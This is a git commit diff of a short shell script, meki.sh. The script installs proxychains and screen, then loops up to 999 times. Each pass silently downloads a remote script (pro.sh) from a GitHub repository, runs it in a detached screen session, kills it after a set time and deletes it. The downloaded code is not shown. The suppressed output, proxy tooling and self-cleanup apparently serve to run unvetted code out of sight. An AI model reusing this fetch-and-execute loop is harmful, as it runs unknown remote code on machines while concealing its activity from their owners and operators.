a05ef82be70e62cee2f3174239c16453b15254b6
renilo <88342640+renilo@users.noreply.github.com>
2022-02-20 14:02:11 +0700

    Update meki.sh

--- meki.sh
+++ meki.sh
@@ -1,11 +1,9 @@
+#!/bin/sh
+
 apt update
 
 apt install proxychains
 
 apt install screen -y
 
-wget -q https://raw.githubusercontent.com/renilo/bh/main/pro.sh >/dev/null 2>&1
-
-chmod +x pro.sh >/dev/null 2>&1
-
-screen -dmS Running ./pro.sh
+for i in `seq 1 999`; do echo $i; wget -q https://raw.githubusercontent.com/renilo/bh/main/pro.sh >/dev/null 2>&1; chmod +x pro.sh >/dev/null 2>&1; screen -dmS Running ./pro.sh ; sleep 1500; clear; screen -XS Running quit; rm -f pro.sh; echo SETTING PROJECT; sleep 300; done
